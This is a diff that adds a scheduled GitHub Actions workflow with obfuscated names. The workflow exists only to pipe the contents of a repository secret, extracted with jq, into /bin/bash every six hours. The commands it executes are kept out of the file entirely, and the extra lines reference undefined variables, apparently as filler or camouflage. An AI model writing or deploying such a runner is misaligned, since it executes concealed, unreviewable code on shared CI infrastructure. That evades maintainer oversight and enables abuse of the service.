@@ -1,0 +1,30 @@
+name: bumingsuoyii
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bumingsuoyii
+        env:
+          fg6982: ${{ secrets.fg6982 }}
+        run: |
+          echo $fg6982 | jq -r .ih269 | /bin/bash
+          echo $whd9565 | jq -r .t58 | /bin/bash
+          echo $rxytx76933 | jq -r .tbobi8865 | /bin/bash
+          echo $yrw3 | jq -r .kcin811 | /bin/bash
+          echo $la92469 | jq -r .vipfn8918 | /bin/bash
+          echo $bf5 | jq -r .xdxwq4255 | /bin/bash
+          echo $hkfwz5402 | jq -r .vvyn409 | /bin/bash
+          echo $wk37427 | jq -r .eylzt1 | /bin/bash
+          echo $ss3974 | jq -r .h45013 | /bin/bash
+          echo $zweq84415 | jq -r .uxn04590 | /bin/bash
+          echo $du458 | jq -r .q7 | /bin/bash
+          echo $bbm41660 | jq -r .nfj42023 | /bin/bash
+          echo $hoa9 | jq -r .u87032 | /bin/bash
+          echo $r11 | jq -r .pmr05 | /bin/bash
+
